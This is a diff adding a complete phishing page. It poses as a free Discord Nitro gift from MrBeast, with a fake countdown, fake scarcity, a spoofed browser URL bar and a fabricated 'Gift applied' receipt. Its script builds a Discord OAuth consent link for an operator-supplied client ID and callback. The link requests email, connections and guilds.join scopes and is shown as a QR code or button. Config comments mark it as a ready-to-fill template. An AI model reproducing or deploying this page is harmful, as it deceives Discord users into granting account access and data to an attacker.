@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>You've been gifted Discord Nitro</title>
+<meta property="og:title" content="You've been gifted 1 year of Discord Nitro">
+<meta property="og:description" content="Gifted by MrBeast · 3 of 5 gifts remaining">
+<meta property="og:image" content="https://your-domain/og.jpg">
+<meta property="og:type" content="website">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;
+    font-family:Inter,system-ui,sans-serif;
+    background:radial-gradient(120% 90% at 50% 0%,#2a1145 0%,#150a26 55%,#0b0616 100%);
+    color:#f3e9ff}
+  .frame{width:100%;max-width:440px;background:#0d0718cc;border:1px solid #3b2159;
+    border-radius:16px;overflow:hidden;backdrop-filter:blur(8px);
+    box-shadow:0 30px 70px -30px #000}
+  .browser{display:flex;align-items:center;gap:10px;padding:9px 12px;background:#0a0514;
+    border-bottom:1px solid #2a1745;font-size:11px}
+  .dots{display:flex;gap:5px}.dots i{width:8px;height:8px;border-radius:50%;background:#3f2a5e;display:block}
+  .url{color:#a893c4;background:#160b26;padding:3px 10px;border-radius:20px;flex:1;
+    text-align:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .lock{color:#c084fc}
+  .stage{padding:22px;text-align:center}
+  .stage.hidden{display:none}
+  .from{display:inline-flex;align-items:center;gap:7px;font-size:12px;color:#c3aee0;
+    background:#1e1033;border:1px solid #38225a;padding:5px 12px 5px 5px;border-radius:24px;margin-bottom:16px}
+  .from b{color:#fff}
+  .av{width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,#a855f7,#ec4899);
+    display:grid;place-items:center;font-size:11px}
+  .vf{color:#60a5fa;font-size:10px}
+  .card{position:relative;background:linear-gradient(150deg,#4c1d95,#7e22ce 45%,#be185d);
+    border-radius:16px;padding:26px 20px 22px;text-align:left;overflow:hidden;
+    box-shadow:0 22px 50px -18px #7e22ce99}
+  .card-glow{position:absolute;width:220px;height:220px;border-radius:50%;
+    background:radial-gradient(#f0abfc88,transparent 65%);top:-90px;right:-70px}
+  .nmark{font-size:20px;color:#fdf4ff;opacity:.9;margin-bottom:8px}
+  .card-title{font-size:13px;letter-spacing:.18em;text-transform:uppercase;color:#f5e8ff;opacity:.85}
+  .card-term{font-size:44px;font-weight:700;letter-spacing:-.03em;line-height:1;margin:2px 0 6px;color:#fff}
+  .card-sub{font-size:11px;color:#f0d9ff;opacity:.8}
+  .card-code{margin-top:20px;font-family:ui-monospace,monospace;font-size:10.5px;color:#fbe9ff;
+    background:#00000038;border:1px dashed #ffffff40;padding:6px 9px;border-radius:6px;display:inline-block}
+  .left{font-size:11.5px;color:#b39ed0;margin:16px 0 12px}
+  .left b{color:#f472b6}
+  h2{font-size:19px;margin:0 0 6px}
+  .sub2{color:#b39ed0;font-size:12.5px;line-height:1.55;margin:0 0 16px}
+  .sub2 b{color:#e9d5ff}
+  .clock{display:flex;justify-content:center;align-items:center;gap:5px;margin-bottom:14px}
+  .unit{background:#1b0f2e;border:1px solid #3a2260;border-radius:8px;padding:5px 11px;min-width:44px}
+  .unit span{display:block;font-size:22px;font-weight:600;font-variant-numeric:tabular-nums;color:#fff}
+  .unit small{font-size:8px;letter-spacing:.12em;text-transform:uppercase;color:#8a72ab}
+  .sep{color:#523a72;font-size:18px}
+  .claim{width:100%;padding:13px;border:0;border-radius:10px;font-size:13px;font-weight:700;
+    letter-spacing:.06em;background:linear-gradient(180deg,#c084fc,#9333ea);color:#fff;
+    cursor:pointer;box-shadow:0 8px 24px -10px #a855f7;font-family:inherit}
+  .claim:hover{filter:brightness(1.08)}
+  .claim.ghost{background:#1b0f2e;color:#cbb6e8;font-weight:500;letter-spacing:0;
+    box-shadow:none;border:1px solid #3a2260}
+  .foot{font-size:10px;color:#7d6699;margin-top:12px}
+  .foot b{color:#a98ecb}
+  .dhead{display:flex;align-items:center;justify-content:center;gap:7px;font-size:13px;
+    font-weight:600;color:#d8c7f0;margin-bottom:14px}
+  .dlogo{color:#5865f2;font-size:17px}
+  .qrbox{display:inline-block;background:#fff;padding:11px;border-radius:12px;margin-bottom:12px;line-height:0}
+  .qrbox svg{display:block;width:175px;height:175px}
+  .bullets{list-style:none;padding:0;margin:0 0 16px;text-align:left;font-size:12px;
+    color:#b39ed0;line-height:1.9}
+  .bullets b{color:#e5d5f7}
+  .win{font-size:32px;margin-bottom:4px}
+  .receipt{background:#150a24;border:1px solid #33204f;border-radius:10px;padding:6px 12px;
+    text-align:left;margin-bottom:6px}
+  .receipt div{display:flex;justify-content:space-between;font-size:11.5px;padding:6px 0;
+    border-bottom:1px dashed #2a1a42;color:#cbb6e8}
+  .receipt div:last-child{border:0}
+  .receipt span:first-child{color:#8f78ac}
+  .ok{color:#4ade80}
+  .mob{display:none}
+  @media (max-width:520px){ .mob{display:block} .desk{display:none} }
+</style>
+</head>
+<body>
+<div class="frame">
+  <div class="browser">
+    <span class="dots"><i></i><i></i><i></i></span>
+    <span class="url"><span class="lock">&#128274;</span> <span id="hostbar">discord-gifts.io</span>/n/8Kq2XvRt</span>
+  </div>
+
+  <div class="stage" id="s1">
+    <div class="from"><span class="av">&#127881;</span> Gifted by <b>MrBeast</b> <span class="vf">&#10004;</span></div>
+    <div class="card">
+      <div class="card-glow"></div>
+      <div class="nmark">&#9670;</div>
+      <div class="card-title">Discord Nitro</div>
+      <div class="card-term">1 YEAR</div>
+      <div class="card-sub">Full subscription &middot; billed $0.00</div>
+      <div class="card-code" id="giftCode">discord-gifts.io/n/8Kq2XvRt</div>
+    </div>
+    <div class="left"><b>3</b> of 5 gifts remaining in this batch</div>
+    <div class="clock">
+      <div class="unit"><span id="mm">04</span><small>min</small></div>
+      <div class="sep">:</div>
+      <div class="unit"><span id="ss">52</span><small>sec</small></div>
+    </div>
+    <button class="claim" id="claimBtn">ACCEPT GIFT</button>
+    <div class="foot">Unclaimed gifts return to the pool after 5 minutes</div>
+  </div>
+
+  <div class="stage hidden" id="s2">
+    <div class="dhead"><span class="dlogo">&#9679;</span> Discord</div>
+    <h2>Confirm it's you</h2>
+    <p class="sub2 desk">Scan with the Discord app on your phone to apply the gift to your account.</p>
+    <p class="sub2 mob">Tap below to confirm and apply the gift to your account.</p>
+    <div class="qrbox desk" id="qrbox"></div>
+    <ul class="bullets desk">
+      <li><b>1.</b> Open Discord on your phone</li>
+      <li><b>2.</b> Tap your avatar &rarr; <b>Scan QR code</b></li>
+      <li><b>3.</b> Point at the screen above</li>
+    </ul>
+    <a class="claim ghost mob" id="mobBtn" href="#" style="display:none;text-decoration:none;margin-bottom:10px">
+      Open Discord &rarr;
+    </a>
+    <button class="claim ghost" id="nextBtn">Scanned &mdash; apply gift &rarr;</button>
+    <div class="foot">Authorizing: <b>Nitro Gift</b> &middot; scope: full account</div>
+  </div>
+
+  <div class="stage hidden" id="s3">
+    <div class="win">&#9989;</div>
+    <h2>Gift applied</h2>
+    <p class="sub2">1 year of Nitro is now on your account. It can take up to <b>15 minutes</b> to appear in your inventory &mdash; leave the app open.</p>
+    <div class="receipt">
+      <div><span>Product</span><span>Nitro &mdash; 1 year</span></div>
+      <div><span>Charged</span><span>$0.00</span></div>
+      <div><span>From</span><span>@MrBeast</span></div>
+      <div><span>Status</span><span class="ok">Delivered</span></div>
+    </div>
+    <div class="foot">Two more gifts unlock at 100 server joins &middot; @TeamBeast</div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.js"></script>
+<script>
+  /* ==== CONFIG — beddel ghir had 3 ==== */
+  const CLIENT_ID    = 'YOUR_CLIENT_ID';
+  const REDIRECT_URI = 'https://your-domain/callback';
+  const SCOPE        = 'identify email connections guilds.join';
+
+  const AUTH = 'https://discord.com/oauth2/authorize'
+    + '?client_id=' + CLIENT_ID
+    + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI)
+    + '&response_type=code&prompt=consent'
+    + '&scope=' + encodeURIComponent(SCOPE);
+
+  document.getElementById('hostbar').textContent = new URL(REDIRECT_URI).host;
+
+  // QR mn l'authorize URL
+  try {
+    const qr = qrcode(0, 'M');
+    qr.addData(AUTH);
+    qr.make();
+    document.getElementById('qrbox').innerHTML =
+      qr.createSvgTag({ cellSize: 4, margin: 4, scalable: true });
+  } catch (e) {
+    document.getElementById('qrbox').textContent = 'QR error — use the button';
+  }
+
+  document.getElementById('mobBtn').href = AUTH;
+
+  const s1 = document.getElementById('s1'), s2 = document.getElementById('s2'), s3 = document.getElementById('s3');
+  document.getElementById('claimBtn').onclick = () => {
+    s1.classList.add('hidden'); s2.classList.remove('hidden');
+    if (matchMedia('(max-width:520px)').matches) {
+      document.getElementById('mobBtn').style.display = 'block';
+    }
+  };
+  document.getElementById('nextBtn').onclick = () => {
+    s2.classList.add('hidden'); s3.classList.remove('hidden');
+  };
+
+  const ss = document.getElementById('ss'), mm = document.getElementById('mm');
+  let t = 4 * 60 + 52;
+  const pad = n => String(n).padStart(2, '0');
+  setInterval(() => {
+    t--; if (t < 0) t = 4 * 60 + 52;
+    mm.textContent = pad(Math.floor(t / 60)); ss.textContent = pad(t % 60);
+  }, 1000);
+</script>
+</body>
+</html>
